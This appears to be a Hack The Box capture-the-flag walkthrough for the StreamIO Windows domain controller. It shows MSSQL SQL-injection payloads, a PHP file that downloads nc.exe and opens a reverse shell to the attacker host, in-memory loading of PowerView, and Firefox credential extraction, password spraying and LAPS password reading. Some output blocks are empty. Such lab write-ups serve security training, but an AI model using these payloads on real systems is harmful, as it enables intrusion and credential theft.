{% include toc icon="cog" title="StreamIO Solution" %}

The [StreamIO](https://app.hackthebox.com/machines/streamio) machine has been created by [JDgodd](https://app.hackthebox.com/users/481778) and [nikk37](https://app.hackthebox.com/users/247264). This is a **medium** Windows Machine with a strong focus on Web applications, Active Directory enumeration and exploitation. 

If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).

# Reconnaissance

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.

**Note:** Always allow a few minutes after the start of an HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.
{: .notice--info}

**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
{: .notice--warning}

This computer seems to be a domain controller for **streamio.htb** and we also have a couple of web-related ports, **HTTP** (80/TCP) and **HTTPS** (443/TCP).

## HTTP Recon

Let's check this website, but before that we will add the domain to our `/etc/hosts` file with the following command:
- `echo "10.129.207.221 streamio.htb" | sudo tee --append /etc/hosts`

Then, we can connect to the website **https://streamio.htb**.

![image-center](/images/htb/htb_streamio_website.png){: .align-center}

We can see we also have a login page, but we will check that later. If we check the certificate, we can see another host **watch.streamio.htb** in the Subject Alt Names (SAN):

![image-center](/images/htb/htb_streamio_cert.png){: .align-center}

Let's add this subdomain to our `/etc/hosts`:
- `echo "10.129.207.221 watch.streamio.htb" | sudo tee --append /etc/hosts`

Then, we can go to **https://watch.streamio.htb**.

![image-center](/images/htb/htb_streamio_watch.png){: .align-center}

If we run [dirbuster](https://www.kali.org/tools/dirbuster/), a Web content scanner, with a common word list we can discover the following URL: https://watch.streamio.htb/search.php.

![image-center](/images/htb/htb_streamio_dirbuster.png){: .align-center}

Let's see if we can find something on this webpage.

# SQL Injection

By looking at the **https://watch.streamio.htb/search.php** page, we discovered that the search feature contained an SQL injection. An SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.

It can be triggered with the following input `1337' UNION SELECT 1,2,3,4,5,6 -- -`.

![image-center](/images/htb/htb_streamio_sqli.png){: .align-center}

We could try to use [sqlmap](https://github.com/sqlmapproject/sqlmap), a testing tool that automates the process of detecting and exploiting SQL injection flaws. However, there is some kind of WAF in front of the application.

![image-center](/images/htb/htb_streamio_waf.png){: .align-center}

While we could fine-tune the `sqlmap` parameters, let’s do this manually. First, we need to know which kind of database we are facing. It can be done with the following request `1337' UNION SELECT 1,@@version,3,4,5,6 -- -`.

![image-center](/images/htb/htb_streamio_sqlv.png){: .align-center}

Okay, it's MSSQL. Now, after a few custom request, we will be able to gather some password hashes. Here we used the following ones:

```sql
/* Get the DB name (STREAMIO) */
1337' UNION SELECT 1,(select DB_NAME()),3,4,5,6-- -
/* Get the tables (movies,users) */
1337' UNION SELECT 1, (SELECT STRING_AGG(name, ',') name FROM STREAMIO..sysobjects WHERE xtype= 'U'),3,4,5,6-- -
/* Get the columns (password, username) */
1337' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
/* Dump the content */
1337' UNION SELECT 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
```

We obtained the following output:

Using a well-known website, [https://crackstation.net](https://crackstation.net), we obtained the following cleartext passwords.

```bash

```

Let's see if one of these accounts is valid.

## More Recon

Back to **https://streamio.htb**, we were able to connect to the website with `yoshihide:66boysandgirls..`. However, we found nothing interesting. Let's do a bit more recon with [gobuster](https://github.com/OJ/gobuster).

```bash

```

The **https://streamio.htb/admin/** page seems interesting, let's take a look after login as `yoshihide`.

![image-center](/images/htb/htb_streamio_admin.png){: .align-center}

We have a few functionalities available but none of them were really helpful. 

Using [ffuf](https://github.com/ffuf/ffuf), another web fuzzer, we will try to discover hidden functionality. Here we used the following list from the famous **SecLists** repository:

- [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt)

**Note:** We used the `--fs 1678` flag to avoid getting too many false positive.
{: .notice--info}

Don't forget to recover the **PHPSESSID** of `yoshihide` to run an authenticated scan. This can be done directly in your web browser.

```bash
$ ffuf -w burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=ij79jktnjnlbkauguc6t42mmg0 --fs 1678

```

It seems that we got a **debug** feature at **https://streamio.htb/admin/?debug=**.

![image-center](/images/htb/htb_streamio_debug.png){: .align-center}

After looking around for a while, we were able to get the source code of some pages using a [PHP wrapper](https://book.hacktricks.xyz/pentesting-web/file-inclusion#php-filter). Here is an example with **index.php** which contains the password for the database:

- https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php

```php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
    header('HTTP/1.1 403 Forbidden');
    die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>

...[snip]...
```

It is an interesting finding, but we can’t really go further with this information. Let's continue to explore the web application.

# Remote File Inclusion

Remote File Inclusion (also known as RFI) is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing external URL to be injected. 

## More Recon

Again, we will use `gobuster`, this time with the `-x php` switch to try to discover interesting web pages to read with the **debug** feature.

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u https://streamio.htb/admin/ -x php -c "PHPSESSID=ij79jktnjnlbkauguc6t42mmg0"

...[snip]...
```

Here we have the following web page: **https://streamio.htb/admin/master.php**

## Code Analysis

We can download the code in base64 with the following request:

- https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php

After decoding the result, we obtained the following code:

```php
...[snip]...

<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?> 
```

Here, we have an RFI vulnerability in the *file_get_contents()* function of the **master.php** page. We can generate a POST request to */admin/?debug=master.php* with the **include** parameters pointing to our backdoor.

We just need to create a malicious PHP file like:

```php
system("curl 10.10.14.101/nc.exe -o c:\\Windows\\Temp\\nc.exe");
system("c:\\windows\\temp\\nc.exe 10.10.14.101 4321 -e cmd.exe");
```

Don't forget to set a listener on the attacking machine with `sudo nc -nlvp 4321`. Then, using Burp proxy, we can craft a POST request:

![image-center](/images/htb/htb_streamio_burp.png){: .align-center}

We have a remote shell!

```bash
$ sudo nc -nlvp 4321
[sudo] password for ax: 
listening on [any] 4321 ...
connect to [10.10.14.101] from (UNKNOWN) [10.129.207.221] 49727

# Initial Access

In a real-world scenario, adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives. With our current shell, let's see if we can find something interesting.

## Playing with MSSQL

After looking around for a while, we decided to take a look at the database as we previously found DB credentials (`db_admin:B1@hx31234567890`) in **index.php**. Note that you should upgrade your shell to PowerShell to avoid any issues when connecting to the DB.

```bash
C:\inetpub\streamio.htb\admin>powershell

(6 rows affected)
```

After listing the databases, we found an interesting one, **STREAMIO_BACKUP**.

```bash
PS C:\inetpub\streamio.htb\admin> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; SELECT username,password FROM users;'
sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select username,password from users;'
Changed database context to 'streamio_backup'.

Nice! Again, with [https://crackstation.net](https://crackstation.net), we obtained the following plaintext passwords.

![image-center](/images/htb/htb_streamio_crack.png){: .align-center}

By looking at the discovered users permission, we can see that **nikk37** (`nikk37:get_dem_girls2@yahoo.com`) has remote management privileges.

```bash
PS C:\inetpub\streamio.htb\admin> net users nikk37
net users nikk37
User name                    nikk37

```    

Now, with `crackmapexec`, let's try to use WinRM (TCP/5985) and see if we effectively have a remote access.

```bash
$ crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
SMB         streamio.htb    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)
HTTP        streamio.htb    5985   DC               [*] http://streamio.htb:5985/wsman
WINRM       streamio.htb    5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)

```

Awesome, this time we can use `evil-winrm` and grab the **first flag.

```bash
$ evil-winrm -i streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'

Evil-WinRM shell v3.4

## More Recon with winPEAS

Here, with [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS), we can scan the machine for information and potential privilege escalation paths.

```bash
*Evil-WinRM* PS C:\Users\nikk37\Documents> upload /home/ax/Downloads/winPEASx64.exe

Looking for Firefox DBs
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
Run SharpWeb (https://github.com/djhohnstein/SharpWeb)

...[snip]...
```

So, **LAPS** is enabled and we have a Firefox database which may contain credentials. We tried the suggested tool, [SharpWeb](https://github.com/djhohnstein/SharpWeb), but it did not work.

We found another tool to do the job, [firepwd](https://github.com/lclevy/firepwd), but we need to download some files locally.

```bash
*Evil-WinRM* PS C:\Users\nikk37\Documents> cd C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> download key4.db
Info: Downloading key4.db to ./key4.db
                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> download logins.json
Info: Downloading logins.json to ./logins.json
                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release>
```

Now, we just have to put these file in the same directory as the tool and recover the credentials.

```bash
$ python3 firepwd.py

...[snip]...

https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

Let's put these credentials in a text file somewhere, we may need them later.

## BloodHound

With a valid account, we can also use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. 

Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Here, we used a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c All -u nikk37 -p get_dem_girls2@yahoo.com -d streamIO.htb -ns 10.129.207.221 --zip
INFO: Found AD domain: streamio.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

INFO: Done in 00M 06S
INFO: Compressing output into 20230427164604_bloodhound.zip
```

By looking at the BloodHound output, we can see that one of the previously recovered account **JDgodd** have the *Owns* privileges on **CORE STAFF@STREAMIO.HTB** and this group can read LAPS passwords!

![image-center](/images/htb/htb_streamio_bloodhound.png){: .align-center}

However, after trying the `JDgodd:password@12` credentials, it did not work...

# Privilege Escalation

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Password Spraying

As stated by [MITRE](https://attack.mitre.org/techniques/T1110/003/), adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password, or a small list of commonly used passwords, that may match the complexity policy of the domain.

Since we have a list of usernames and passwords, we can use [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), to see if we can get another account.

```bash
$ crackmapexec smb streamio.htb -u users.txt -p pass.txt               

...[snip]...

SMB         streamio.htb    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
```

Yay! We found valid credentials for **JDgodd**! Now, we can try to abuse its current privileges to read LAPS password.

## Owning the domain

Here, the user **JDGODD@STREAMIO.HTB** has the ability to modify the owner of the group **CORE STAFF@STREAMIO.HTB**. It means that we can take over this group and add **JDgodd** in it.

This can easily be done using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

```bash
*Evil-WinRM* PS C:\Users\nikk37\Documents> IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.101/PowerView.ps1')
*Evil-WinRM* PS C:\Users\nikk37\Documents> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nikk37\Documents> $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
*Evil-WinRM* PS C:\Users\nikk37\Documents> Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
*Evil-WinRM* PS C:\Users\nikk37\Documents> net group 'CORE STAFF'
Group name     CORE STAFF
Comment

Members

-------------------------------------------------------------------------------
JDgodd
The command completed successfully.

*Evil-WinRM* PS C:\Users\nikk37\Documents> 
```

Now that we are part of the **CORE STAFF@STREAMIO.HTB** group, we can use `ldapsearch` to query the **ms-MCS-AdmPwd** attribute of the domain controller.


```bash
$ ldapsearch -x -b 'DC=streamIO,DC=htb' -H ldap://10.129.207.221 -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: p-294I{bf,t2a1
```

Finally, we can connect as administrator on the box and grab the **second flag**.

```bash
$ evil-winrm -i streamio.htb -u administrator -p 'p-294I{bf,t2a1'
